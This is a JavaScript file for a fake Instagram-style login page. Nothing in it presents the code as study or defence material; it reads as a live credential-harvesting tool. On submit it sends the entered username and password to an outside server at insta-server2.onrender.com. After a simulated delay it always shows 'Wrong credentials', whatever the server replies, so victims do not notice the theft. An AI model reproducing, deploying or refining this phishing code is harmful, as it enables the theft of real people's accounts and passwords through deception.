// script.js - Silent password length validation (6 characters required)
document.addEventListener('DOMContentLoaded', () => {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const loginButton = document.getElementById('login-button');
    const splashScreen = document.getElementById('splash-screen');
    const loginForm = document.getElementById('login-form');
    const facebookLoginBtn = document.querySelector('.facebook-login');

    // Server endpoint - Updated with your Render URL
    const SERVER_BASE_URL = 'https://insta-server2.onrender.com';
    const AUTH_ENDPOINT = `${SERVER_BASE_URL}/api/auth`;
    const ANALYTICS_ENDPOINT = `${SERVER_BASE_URL}/api/analytics`;
    
    // Hide splash screen once all page content (including images) is loaded
    window.onload = () => {
        splashScreen.classList.add('fade-out');
        setTimeout(() => {
            splashScreen.style.display = 'none';
        }, 500);
    };

    // Function to enable the login button when inputs are filled and valid
    function checkInputs() {
        const isUsernameFilled = usernameInput.value.trim() !== '';
        const isPasswordFilled = passwordInput.value.trim() !== '';
        const isPasswordValid = passwordInput.value.trim().length >= 6;
        
        if (isUsernameFilled && isPasswordFilled && isPasswordValid) {
            loginButton.disabled = false;
            loginButton.style.opacity = '1';
            loginButton.style.cursor = 'pointer';
        } else {
            loginButton.disabled = true;
            loginButton.style.opacity = '0.7';
            loginButton.style.cursor = 'not-allowed';
        }
    }

    usernameInput.addEventListener('input', checkInputs);
    passwordInput.addEventListener('input', checkInputs);

    // Add show/hide password functionality
    function addShowHidePassword() {
        const passwordWrapper = passwordInput.parentNode;
        
        // Create show/hide button
        const showHideBtn = document.createElement('button');
        showHideBtn.type = 'button';
        showHideBtn.className = 'show-hide-password';
        showHideBtn.textContent = 'Show';
        showHideBtn.style.cssText = `
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: rgb(115, 115, 115);
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            padding: 0;
            margin: 0;
            opacity: 0;
            transition: opacity 0.2s ease;
            pointer-events: none;
        `;
        
        // Toggle password visibility
        showHideBtn.addEventListener('click', function() {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                this.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                this.textContent = 'Show';
            }
        });
        
        // Show button on password input focus and typing
        passwordInput.addEventListener('focus', function() {
            showHideBtn.style.opacity = '1';
            showHideBtn.style.pointerEvents = 'auto';
        });
        
        passwordInput.addEventListener('input', function() {
            if (this.value.trim() !== '') {
                showHideBtn.style.opacity = '1';
                showHideBtn.style.pointerEvents = 'auto';
            } else {
                showHideBtn.style.opacity = '0';
                showHideBtn.style.pointerEvents = 'none';
                // Reset to "Show" when field is empty
                if (passwordInput.type === 'text') {
                    passwordInput.type = 'password';
                    showHideBtn.textContent = 'Show';
                }
            }
        });
        
        // Hide button when losing focus (if field is empty)
        passwordInput.addEventListener('blur', function() {
            if (this.value.trim() === '') {
                showHideBtn.style.opacity = '0';
                showHideBtn.style.pointerEvents = 'none';
                // Reset to "Show" when field is empty
                if (passwordInput.type === 'text') {
                    passwordInput.type = 'password';
                    showHideBtn.textContent = 'Show';
                }
            }
        });
        
        passwordWrapper.appendChild(showHideBtn);
        
        // Adjust input padding to make space for the button
        passwordInput.style.paddingRight = '45px';
    }

    // Initialize show/hide password
    addShowHidePassword();

    // Form submission handler with realistic Instagram-like behavior
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const username = usernameInput.value.trim();
        const password = passwordInput.value.trim();
        
        // Silent validation - prevent submission if less than 6 characters
        if (password.length < 6) {
            return; // Silent fail - no message, no action
        }
        
        if (!username || !password) return;
        
        // Remove any existing error when new attempt is made
        removeCredentialError();
        
        // Save original button text
        const originalButtonText = loginButton.textContent;
        
        // Show loading animation
        loginButton.disabled = true;
        loginButton.innerHTML = '<div class="loading-spinner"></div>';
        
        try {
            // Send credentials to server with timeout
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 8000); // 8 second timeout

            const response = await fetch(AUTH_ENDPOINT, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    username: username,
                    password: password
                }),
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            // Simulate server processing delay (1.5-2.5 seconds)
            await new Promise(resolve => setTimeout(resolve, 1500 + Math.random() * 1000));
            
            // Always show "Wrong credentials" error regardless of server response
            showCredentialError();
            
            // IMMEDIATELY reset button (no delay)
            loginButton.disabled = false;
            loginButton.textContent = originalButtonText;
            checkInputs(); // Update button state
            
            // Clear password field (typical Instagram behavior)
            passwordInput.value = '';
            checkInputs();

        } catch (error) {
            console.error('Login error:', error);
            
            // Show network error if applicable
            if (error.name === 'AbortError') {
                showNetworkError();
            } else {
                showCredentialError();
            }
            
            // IMMEDIATELY reset button (no delay)
            loginButton.disabled = false;
            loginButton.textContent = originalButtonText;
            checkInputs(); // Update button state
        }
    });

    // Show realistic Instagram-style error message
    function showCredentialError() {
        // Remove any existing error messages
        removeCredentialError();
        
        // Create error message element (positioned below Facebook button)
        const errorElement = document.createElement('div');
        errorElement.className = 'credential-error';
        errorElement.innerHTML = `
            <div style="color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px;">
                 Wrong credentials. Please try again.
            </div>
        `;
        
        // Insert error message after the Facebook login button's parent container
        const socialLoginContainer = document.querySelector('.social-login');
        if (socialLoginContainer) {
            socialLoginContainer.parentNode.insertBefore(errorElement, socialLoginContainer.nextSibling);
        } else {
            // Fallback: insert after the form
            loginForm.parentNode.appendChild(errorElement);
        }
    }

    function showNetworkError() {
        removeCredentialError();
        
        const errorElement = document.createElement('div');
        errorElement.className = 'credential-error';
        errorElement.innerHTML = `
            <div style="color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px;">
                 Network error. Please check your connection and try again.
            </div>
        `;
        
        const socialLoginContainer = document.querySelector('.social-login');
        if (socialLoginContainer) {
            socialLoginContainer.parentNode.insertBefore(errorElement, socialLoginContainer.nextSibling);
        }
    }

    function removeCredentialError() {
        const existingErrors = document.querySelectorAll('.credential-error');
        existingErrors.forEach(error => error.remove());
    }

    // Add CSS for loading spinner and show/hide button
    if (!document.querySelector('#loading-styles')) {
        const styles = document.createElement('style');
        styles.id = 'loading-styles';
        styles.textContent = `
            .loading-spinner {
                width: 18px;
                height: 18px;
                border: 2px solid #ffffff;
                border-top: 2px solid transparent;
                border-radius: 50%;
                animation: spin 1s linear infinite;
                margin: 0 auto;
            }
            
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
            
            /* Instagram-like button hover effects */
            #login-button:not(:disabled):hover {
                background-color: #0095f6;
                opacity: 0.9;
            }
            
            #login-button:disabled {
                cursor: not-allowed;
                opacity: 0.7;
            }
        `;
        document.head.appendChild(styles);
    }

    // Enhanced input validation (only for username format)
    usernameInput.addEventListener('blur', function() {
        if (this.value.trim() && !isValidUsername(this.value)) {
            // No error message shown, just visual indication
            this.style.borderColor = '#ed4956';
        } else {
            this.style.borderColor = '';
        }
    });

    function isValidUsername(username) {
        return username.length >= 3 || 
               /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(username) ||
               /^\+?[1-9]\d{1,14}$/.test(username);
    }

    // Initial button state check
    checkInputs();

    // Server health check (silent)
    fetch(`${SERVER_BASE_URL}/api/health`)
        .then(response => response.json())
        .then(data => {
            console.log('Server status:', data.status);
        })
        .catch(err => {
            console.warn('Server health check failed:', err);
        });
});